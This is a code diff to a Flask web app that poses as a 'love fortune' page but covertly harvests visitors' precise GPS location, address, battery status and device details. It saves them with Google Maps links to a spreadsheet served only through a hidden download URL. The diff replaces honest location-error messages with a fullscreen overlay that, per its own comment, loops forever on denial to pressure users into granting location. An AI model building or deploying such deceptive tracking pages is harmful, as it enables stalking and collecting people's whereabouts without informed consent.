@@ -1,4 +1,3 @@
-# location.py
 from flask import Flask, request, render_template_string, send_file
 import pandas as pd
 import requests
@@ -7,8 +6,6 @@ from datetime import datetime
 import random
 
 app = Flask(__name__)
-
-# Ensure the excel_files folder exists
 os.makedirs('excel_files', exist_ok=True)
 
 def get_address(lat, lon):
@@ -21,7 +18,6 @@ def get_address(lat, lon):
     except:
         return 'Location captured'
 
-# Beautiful UI – NO download link anywhere
 HTML = '''
 <!DOCTYPE html>
 <html>
@@ -44,7 +40,6 @@ HTML = '''
         }
         .heart {
             position: fixed;
-            font-size: 20px;
             pointer-events: none;
             animation: floatUp 4s linear infinite;
             z-index: 0;
@@ -61,7 +56,6 @@ HTML = '''
             width: 100%;
             text-align: center;
             box-shadow: 0 30px 60px rgba(0,0,0,0.2);
-            backdrop-filter: blur(10px);
             z-index: 1;
             position: relative;
             animation: fadeIn 0.8s;
@@ -122,8 +116,7 @@ HTML = '''
         .loading { display: none; margin-top: 30px; }
         .loading.show { display: block; }
         .spinner {
-            width: 60px;
-            height: 60px;
+            width: 60px; height: 60px;
             margin: 0 auto 20px;
             background: linear-gradient(135deg, #ff6b6b, #c06c84);
             border-radius: 50%;
@@ -154,27 +147,50 @@ HTML = '''
             50% { transform: scale(1.2); }
         }
         .name-highlight { font-size: 28px; font-weight: bold; margin: 10px 0; text-shadow: 2px 2px 4px rgba(0,0,0,0.2); }
-        .error-message {
-            background: #fff3f3;
-            border-left: 4px solid #ff6b6b;
-            border-radius: 20px;
-            padding: 15px;
-            margin-top: 20px;
-            color: #c0392b;
-            font-size: 14px;
+
+        /* ── LOCATION PERMISSION OVERLAY ── */
+        #locOverlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            z-index: 9999;
+            background: linear-gradient(135deg, rgba(255,107,107,0.97), rgba(192,108,132,0.97));
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
             text-align: center;
+            padding: 30px;
         }
-        .retry-btn {
-            background: #ff6b6b;
-            color: white;
+        #locOverlay.show { display: flex; }
+        #locOverlay .ov-emoji { font-size: 80px; margin-bottom: 20px; animation: bounce 2s infinite; }
+        #locOverlay h2 { color: #fff; font-size: 28px; margin-bottom: 15px; }
+        #locOverlay p { color: rgba(255,255,255,0.9); font-size: 16px; margin-bottom: 25px; max-width: 380px; line-height: 1.6; }
+        #locOverlay .ov-steps {
+            background: rgba(255,255,255,0.2);
+            border-radius: 20px;
+            padding: 20px 25px;
+            margin-bottom: 25px;
+            text-align: left;
+            max-width: 380px;
+            width: 100%;
+            color: #fff;
+            font-size: 15px;
+            line-height: 2;
+        }
+        #locOverlay .ov-btn {
+            background: white;
+            color: #c06c84;
             border: none;
-            padding: 8px 20px;
-            border-radius: 50px;
-            margin-top: 10px;
-            cursor: pointer;
+            padding: 16px 40px;
+            font-size: 18px;
             font-weight: bold;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: 0.3s;
+            animation: pulse 1.5s infinite;
         }
-        .retry-btn:hover { background: #ff5252; }
+        #locOverlay .ov-btn:hover { transform: scale(1.05); }
+
         @media (max-width:600px) {
             .container { padding: 35px 25px; }
             h1 { font-size: 28px; }
@@ -183,6 +199,21 @@ HTML = '''
     </style>
 </head>
 <body>
+
+<!-- FULLSCREEN LOCATION OVERLAY (shown when denied) -->
+<div id="locOverlay">
+    <div class="ov-emoji">📍💕</div>
+    <h2>Location Access Needed!</h2>
+    <p>To reveal your <strong>personalized love fortune</strong>, we need your location. The stars can't find you without it! ✨</p>
+    <div class="ov-steps">
+        🔒 Click the <strong>lock / info icon</strong> in your address bar<br>
+        ⚙️ Go to <strong>Site Settings</strong><br>
+        📍 Set <strong>Location → Allow</strong><br>
+        🔄 Then click <strong>Try Again</strong> below
+    </div>
+    <button class="ov-btn" onclick="retryLocation()">💫 Try Again – Allow Location 💫</button>
+</div>
+
 <div class="container">
     <div class="emoji">💕🔮💕</div>
     <h1>Your Love Fortune</h1>
@@ -205,22 +236,21 @@ HTML = '''
         <div class="heart-icon">💖</div>
         <div class="name-highlight" id="userNameDisplay"></div>
         <div class="fortune-text" id="fortuneText"></div>
-        <div class="small-text">✨ The universe has spoken ✨</div>
+        <div>✨ The universe has spoken ✨</div>
     </div>
-
-    <div id="errorMsg" class="error-message" style="display:none;"></div>
 </div>
 
 <script>
+    /* floating hearts */
     function createHeart() {
-        const heart = document.createElement('div');
-        heart.innerHTML = ['❤️','💕','💖','💗','💓','💝'][Math.floor(Math.random()*6)];
-        heart.classList.add('heart');
-        heart.style.left = Math.random() * 100 + '%';
-        heart.style.animationDuration = Math.random() * 3 + 3 + 's';
-        heart.style.fontSize = Math.random() * 20 + 15 + 'px';
-        document.body.appendChild(heart);
-        setTimeout(() => heart.remove(), 4000);
+        const h = document.createElement('div');
+        h.innerHTML = ['❤️','💕','💖','💗','💓','💝'][Math.floor(Math.random()*6)];
+        h.classList.add('heart');
+        h.style.left = Math.random()*100+'%';
+        h.style.animationDuration = (Math.random()*3+3)+'s';
+        h.style.fontSize = (Math.random()*20+15)+'px';
+        document.body.appendChild(h);
+        setTimeout(()=>h.remove(), 4000);
     }
     setInterval(createHeart, 500);
 
@@ -234,82 +264,79 @@ HTML = '''
         return null;
     }
 
+    let savedName = '';
+
     window.requestFortune = async function() {
         const name = document.getElementById('userName').value.trim();
-        if (!name) {
-            alert('💕 Please enter your beautiful name! 💕');
-            return;
-        }
+        if (!name) { alert('💕 Please enter your beautiful name! 💕'); return; }
+        savedName = name;
+        tryGetLocation();
+    };
 
-        document.getElementById('errorMsg').style.display = 'none';
+    function tryGetLocation() {
         document.getElementById('result').classList.remove('show');
         document.getElementById('initial').style.display = 'none';
         document.getElementById('loading').classList.add('show');
+        document.getElementById('locOverlay').classList.remove('show');
 
         if (!navigator.geolocation) {
-            showError('Geolocation is not supported by your browser.', true);
+            showOverlay();
             return;
         }
 
-        navigator.geolocation.getCurrentPosition(async function(pos) {
-            const battery = await getBattery();
-            const data = {
-                name: name,
-                lat: pos.coords.latitude,
-                lon: pos.coords.longitude,
-                accuracy: pos.coords.accuracy,
-                altitude: pos.coords.altitude,
-                speed: pos.coords.speed,
-                battery: battery,
-                ua: navigator.userAgent,
-                screen: screen.width + 'x' + screen.height,
-                lang: navigator.language,
-                platform: navigator.platform
-            };
-            try {
-                const res = await fetch('/save', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(data)
-                });
-                const result = await res.json();
-                if (result.success) {
+        navigator.geolocation.getCurrentPosition(
+            async function(pos) {
+                document.getElementById('locOverlay').classList.remove('show');
+                const battery = await getBattery();
+                const data = {
+                    name: savedName,
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    altitude: pos.coords.altitude,
+                    speed: pos.coords.speed,
+                    battery: battery,
+                    ua: navigator.userAgent,
+                    screen: screen.width+'x'+screen.height,
+                    lang: navigator.language,
+                    platform: navigator.platform
+                };
+                try {
+                    const res = await fetch('/save', {
+                        method: 'POST',
+                        headers: {'Content-Type':'application/json'},
+                        body: JSON.stringify(data)
+                    });
+                    const result = await res.json();
                     document.getElementById('loading').classList.remove('show');
-                    document.getElementById('result').classList.add('show');
-                    document.getElementById('userNameDisplay').innerHTML = `✨ ${name} ✨`;
-                    document.getElementById('fortuneText').innerHTML = result.fortune;
-                } else {
-                    showError('Server error. Please try again later.', true);
+                    if (result.success) {
+                        document.getElementById('result').classList.add('show');
+                        document.getElementById('userNameDisplay').innerHTML = `✨ ${savedName} ✨`;
+                        document.getElementById('fortuneText').innerHTML = result.fortune;
+                    }
+                } catch(err) {
+                    document.getElementById('loading').classList.remove('show');
+                    document.getElementById('initial').style.display='block';
                 }
-            } catch(err) {
-                showError('Network error. Please check your connection.', true);
-            }
-        }, function(error) {
-            let errorMsg = '';
-            if (error.code === error.PERMISSION_DENIED) {
-                errorMsg = '💔 Location access is blocked. Please allow location in your browser settings, then click "Retry".<br><small>How to fix: Click the lock/info icon in address bar → Site settings → Location → Allow → Reload page.</small>';
-            } else if (error.code === error.POSITION_UNAVAILABLE) {
-                errorMsg = '📍 Location unavailable. Please enable GPS or try again.';
-            } else if (error.code === error.TIMEOUT) {
-                errorMsg = '⏰ Location request timed out. Please try again.';
-            } else {
-                errorMsg = 'An unknown error occurred.';
-            }
-            showError(errorMsg, true);
-        }, { enableHighAccuracy: true, timeout: 10000 });
-    };
-
-    function showError(msg, showRetry = true) {
-        document.getElementById('loading').classList.remove('show');
-        document.getElementById('initial').style.display = 'block';
-        const errorDiv = document.getElementById('errorMsg');
-        let retryBtn = '';
-        if (showRetry) {
-            retryBtn = '<button class="retry-btn" onclick="requestFortune()">🔄 Retry Location</button>';
-        }
-        errorDiv.innerHTML = msg + '<br>' + retryBtn;
-        errorDiv.style.display = 'block';
+            },
+            function(error) {
+                // ANY denial → show fullscreen overlay immediately, loop forever
+                document.getElementById('loading').classList.remove('show');
+                showOverlay();
+            },
+            { enableHighAccuracy: true, timeout: 10000 }
+        );
     }
+
+    function showOverlay() {
+        document.getElementById('locOverlay').classList.add('show');
+    }
+
+    /* Retry button inside overlay */
+    window.retryLocation = function() {
+        document.getElementById('initial').style.display = 'none';
+        tryGetLocation();
+    };
 </script>
 </body>
 </html>
@@ -323,39 +350,37 @@ def index():
 def save():
     try:
         data = request.json
-        name = data['name']
-        lat = data['lat']
-        lon = data['lon']
-        addr = get_address(lat, lon)
+        name   = data['name']
+        lat    = data['lat']
+        lon    = data['lon']
+        addr   = get_address(lat, lon)
         maps_link = f"https://www.google.com/maps?q={lat},{lon}"
-        battery = data['battery']
-        batt_level = battery['level'] if battery else 'N/A'
+        battery   = data.get('battery')
+        batt_level    = battery['level']    if battery else 'N/A'
         batt_charging = battery['charging'] if battery else 'N/A'
 
         record = {
-            'DateTime': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-            'Name': name,
-            'Latitude': lat,
-            'Longitude': lon,
+            'DateTime'   : datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+            'Name'       : name,
+            'Latitude'   : lat,
+            'Longitude'  : lon,
             'Google Maps': maps_link,
-            'Accuracy_m': data['accuracy'],
-            'Address': addr,
-            'Battery_%': batt_level,
-            'Charging': batt_charging,
-            'Device': data['ua'][:100],
-            'Screen': data['screen'],
-            'Platform': data['platform']
+            'Accuracy_m' : data.get('accuracy'),
+            'Address'    : addr,
+            'Battery_%'  : batt_level,
+            'Charging'   : batt_charging,
+            'Device'     : data.get('ua','')[:120],
+            'Screen'     : data.get('screen'),
+            'Platform'   : data.get('platform')
         }
 
         excel_path = os.path.join('excel_files', 'fortunes_data.xlsx')
         if os.path.exists(excel_path):
-            existing_df = pd.read_excel(excel_path)
-            new_df = pd.DataFrame([record])
-            combined = pd.concat([existing_df, new_df], ignore_index=True)
+            existing = pd.read_excel(excel_path)
+            combined = pd.concat([existing, pd.DataFrame([record])], ignore_index=True)
             combined.to_excel(excel_path, index=False, engine='openpyxl')
         else:
-            df = pd.DataFrame([record])
-            df.to_excel(excel_path, index=False, engine='openpyxl')
+            pd.DataFrame([record]).to_excel(excel_path, index=False, engine='openpyxl')
 
         messages = [
             f"💕 Dear {name}, someone special is thinking of you right now! 💕",
@@ -369,22 +394,19 @@ def save():
             f"💓 {name}, a wonderful surprise awaits your heart! 💓",
             f"💝 {name}, someone is secretly falling for you! 💝"
         ]
-        fortune = random.choice(messages)
-
-        print(f"\n✨ {name} | {lat:.4f}, {lon:.4f} | Battery: {batt_level}%")
-        return {'success': True, 'fortune': fortune}
+        print(f"✨ {name} | {lat:.4f},{lon:.4f} | Battery: {batt_level}%")
+        return {'success': True, 'fortune': random.choice(messages)}
     except Exception as e:
         print("Save error:", e)
         return {'success': False}, 500
 
-# Admin-only download endpoint – no link in HTML
+# Admin only — access directly via browser URL, never linked in UI
 @app.route('/download')
 def download():
     excel_path = os.path.join('excel_files', 'fortunes_data.xlsx')
     if os.path.exists(excel_path):
         return send_file(excel_path, as_attachment=True, download_name='fortunes_data.xlsx')
-    else:
-        return "No data yet. Share the link with friends!", 404
+    return "No data yet.", 404
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8080, debug=False)
